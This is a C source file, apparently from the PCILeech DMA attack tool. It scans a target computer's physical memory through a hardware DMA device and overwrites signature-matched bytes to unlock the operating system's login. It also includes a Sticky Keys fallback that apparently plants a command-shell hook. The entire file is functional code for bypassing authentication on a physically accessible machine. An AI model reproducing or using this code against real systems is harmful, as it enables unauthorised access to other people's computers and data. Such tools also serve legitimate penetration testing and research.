// mempatch.c : implementation related to operating systems unlock/patch functionality.
//
// (c) Ulf Frisk, 2016-2019
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "mempatch.h"
#include "device.h"
#include "util.h"

BOOL Patch_CmpChunk(_In_ PBYTE pbPage, _In_ PSIGNATURE_CHUNK pChunk, _In_opt_ DWORD dwRelBase, _Out_opt_ PDWORD pdwOffset)
{
    DWORD o;
    if(pChunk->tpOffset == SIGNATURE_CHUNK_TP_OFFSET_FIXED) {
        if(pChunk->cbOffset + pChunk->cb > 0x1000) { return FALSE; }
        if(0 == memcmp(pbPage + pChunk->cbOffset, pChunk->pb, pChunk->cb)) {
            if(pdwOffset) { *pdwOffset = pChunk->cbOffset; }
            return TRUE;
        }
    }
    if(pChunk->tpOffset == SIGNATURE_CHUNK_TP_OFFSET_RELATIVE) {
        if(pChunk->cbOffset + dwRelBase + pChunk->cb > 0x1000) { return FALSE; }
        if(0 == memcmp(pbPage + dwRelBase + pChunk->cbOffset, pChunk->pb, pChunk->cb)) {
            if(pdwOffset) { *pdwOffset = dwRelBase + pChunk->cbOffset; }
            return TRUE;
        }
    }
    if(pChunk->tpOffset == SIGNATURE_CHUNK_TP_OFFSET_ANY) {
        for(o = 0; o <= 0x1000 - pChunk->cb; o++) {
            // comparison - extra "unnecessary" dword comparison for speedup reasons.
            if(((pChunk->cb < sizeof(DWORD)) || (*(PDWORD)pChunk->pb == *(PDWORD)(pbPage + o))) &&
                (0 == memcmp(pbPage + o, pChunk->pb, pChunk->cb))) {
                if(pdwOffset) { *pdwOffset = o; }
                return TRUE;
            }
        }
    }
    return FALSE;
}

BOOL Patch_FindAndPatch(_Inout_ PBYTE pbPage, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwPatchOffset, _Out_ PSIGNATURE *pps, _In_ BOOL pPatch)
{
    DWORD i, o, dwRelBase;
    PSIGNATURE ps;
    for(i = 0; i < cSignatures; i++) {
        ps = pSignatures + i;
        if(!ps->chunk[0].cb || !Patch_CmpChunk(pbPage, &ps->chunk[0], 0, &dwRelBase)) {
            continue;
        }
        if(ps->chunk[1].cb && !Patch_CmpChunk(pbPage, &ps->chunk[1], dwRelBase, NULL)) {
            continue;
        }
        o = ps->chunk[2].cbOffset;
        if(ps->chunk[2].tpOffset == SIGNATURE_CHUNK_TP_OFFSET_RELATIVE) { 
            o += dwRelBase;
        }
        if(o + ps->chunk[2].cb < 0x1000) {
            if (pPatch) memcpy(pbPage + o, ps->chunk[2].pb, ps->chunk[2].cb);
            *pdwPatchOffset = o;
            *pps = ps;
            return TRUE;
        }
    }
    return FALSE;
}

#define MAX_NUM_PATCH_LOCATIONS        0x100

VOID ActionPatchAndSearch()
{
    SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES], oSignatures_cmd[CONFIG_MAX_SIGNATURES];
    PSIGNATURE pps, pps_cmd;
    DWORD dwoPatch, dwoPatch_cmd, cSignatures = CONFIG_MAX_SIGNATURES, cSignatures_cmd = CONFIG_MAX_SIGNATURES;
    QWORD qwAddrBase, qwAddrBase_cmd;
    PBYTE pbBuffer16M = NULL;
    PPAGE_STATISTICS pPageStat = NULL;
    BOOL result, result_cmd, isModePatch = ctxMain->cfg.tpAction == PATCH;
    LPSTR szAction = isModePatch ? "Patch" : "Search";
    QWORD i, qwoPages, qwoPages_cmd, qwPatchList[MAX_NUM_PATCH_LOCATIONS], cPatchList = 0;
    // initialize / allocate memory
    if(!(pbBuffer16M = LocalAlloc(0, 0x01000000))) { goto cleanup; }
    qwAddrBase = ctxMain->cfg.qwAddrMin;
    if(ctxMain->cfg.qwAddrMax < qwAddrBase + 0xfff) {
        printf("%s: Failed. Zero or negative memory range specified.\n", szAction);
        goto cleanup;
    }
    // load and verify signatures
    if(ctxMain->cfg.cbIn) {
        Util_CreateSignatureSearchAll(ctxMain->cfg.pbIn, (DWORD)ctxMain->cfg.cbIn, oSignatures);
        cSignatures = 1;
    } else {
        result = Util_LoadSignatures(ctxMain->cfg.szSignatureName, ".sig", oSignatures, &cSignatures, 3);
        if(!result || !cSignatures) {
            printf("%s: Failed. Failed to load signature.\n", szAction);
            goto cleanup;
        }
    }
    if(isModePatch) {
        for(i = 0; i < cSignatures; i++) {
            if(oSignatures[i].chunk[2].cb == 0 || oSignatures[i].chunk[2].cb > 4096 || oSignatures[i].chunk[2].tpOffset == SIGNATURE_CHUNK_TP_OFFSET_ANY) {
                printf("%s: Failed. Invalid patch signature.\n", szAction);
            }
        }

        result_cmd = Util_LoadSignatures("stickykeys_cmd_win", ".sig", oSignatures_cmd, &cSignatures_cmd, 3);
        if(!result_cmd || !cSignatures_cmd) {
            printf("%s: Failed. Failed to load signature[stickykeys_cmd_win].\n", szAction);
        }
    }

    result_cmd = FALSE;
    // loop patch / unlock
    PageStatInitialize(&pPageStat, qwAddrBase, ctxMain->cfg.qwAddrMax, isModePatch ? "Patching" : "Searching", ctxMain->phKMD ? TRUE : FALSE, ctxMain->cfg.fVerbose);
    for(; qwAddrBase < ctxMain->cfg.qwAddrMax; qwAddrBase += 0x01000000) {
        result = Util_Read16M(pbBuffer16M, qwAddrBase, pPageStat);
        if(!result && !ctxMain->cfg.fForceRW && !ctxMain->phKMD && (ctxMain->dev.tpDevice == LEECHCORE_DEVICE_USB3380)) {
            // terminate if 16MB cannot be read from the USB3380 device.
            PageStatClose(&pPageStat);
            printf("%s: Failed. Cannot dump any sequential data in 16MB - terminating.\n", szAction);
            goto cleanup;
        }
        for(qwoPages = 0; (qwoPages < 0x01000000) && (qwAddrBase + qwoPages < ctxMain->cfg.qwAddrMax); qwoPages += 0x1000) {
            if (!result_cmd) {
                result_cmd = Patch_FindAndPatch(pbBuffer16M + qwoPages, oSignatures_cmd, cSignatures_cmd, &dwoPatch_cmd, &pps_cmd, FALSE);
                qwoPages_cmd = qwoPages;
                qwAddrBase_cmd = qwAddrBase;
            }

            result = Patch_FindAndPatch(pbBuffer16M + qwoPages, oSignatures, cSignatures, &dwoPatch, &pps, TRUE);
            if(!result) {
                continue;
            }

            if(isModePatch) {
                result = DeviceWriteMEM(qwAddrBase + qwoPages + dwoPatch, pbBuffer16M + qwoPages + dwoPatch, pps->chunk[2].cb, 0);
            }
            if(result) {
                if(cPatchList == MAX_NUM_PATCH_LOCATIONS) {
                    PageStatClose(&pPageStat);
                    printf("%s: Failed. More than %i signatures found. Location: 0x%llx\n", szAction, MAX_NUM_PATCH_LOCATIONS, qwAddrBase + qwoPages + dwoPatch);
                    goto cleanup;
                }
                qwPatchList[cPatchList] = qwAddrBase + qwoPages + dwoPatch;
                cPatchList++;
            } else {
                PageStatClose(&pPageStat);
                printf("%s: Failed. Write memory failed. Location: 0x%llx\n", szAction, qwAddrBase + qwoPages + dwoPatch);
                goto cleanup;
            }
            if(!ctxMain->cfg.fPatchAll) {
                goto cleanup;
            }
        }
    }
    if(0 == cPatchList) {
        if (result_cmd && isModePatch) {
            Util_Read16M(pbBuffer16M, qwAddrBase_cmd, pPageStat);
            memcpy(pbBuffer16M + qwoPages_cmd + dwoPatch_cmd, pps_cmd->chunk[2].pb, pps_cmd->chunk[2].cb);
            DeviceWriteMEM(qwAddrBase_cmd + qwoPages_cmd + dwoPatch_cmd, pbBuffer16M + qwoPages_cmd + dwoPatch_cmd, pps_cmd->chunk[2].cb, 0);
            PageStatClose(&pPageStat);
            printf("Patch: [stickykeys_cmd_win] Successful.\n");
        } else {
            PageStatClose(&pPageStat);
            printf("%s: Failed. No signature found.\n", szAction);
        }
    }
cleanup:
    PageStatClose(&pPageStat);
    if(cPatchList) {
        for(i = 0; i < cPatchList; i++) {
            printf("%s: Successful. Location: 0x%llx\n", szAction, qwPatchList[i]);
        }
    }
    LocalFree(pbBuffer16M);
}
